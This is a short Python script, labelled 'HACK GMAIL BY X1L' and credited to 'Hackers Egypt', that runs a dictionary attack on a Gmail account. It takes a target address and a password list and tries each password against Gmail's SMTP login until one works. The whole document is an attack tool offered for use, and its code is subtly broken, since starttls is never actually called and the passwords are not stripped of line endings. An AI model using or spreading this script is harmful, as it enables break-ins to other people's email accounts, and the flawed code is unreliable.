import smtplib
from termcolor import *
#Hackers Egypt
print ("HACK GMAIL BY X1L ")
smtpserver = smtplib.SMTP("smtp.gmail.com",587)
smtpserver.ehlo()
smtpserver.starttls

user = raw_input ("enter email target:")
passwfile = raw_input ("enter path list password:")
passwfile = open(passwfile,"r")

for password in  passwfile:
            try:
                 smtpserver.login(user,password)
                 print ("[+] password found =====>%s") %password
                 break;
            except smtplib.SMTPAuthenticationError:
                 print ("[?] password not founed =====>%s") %password
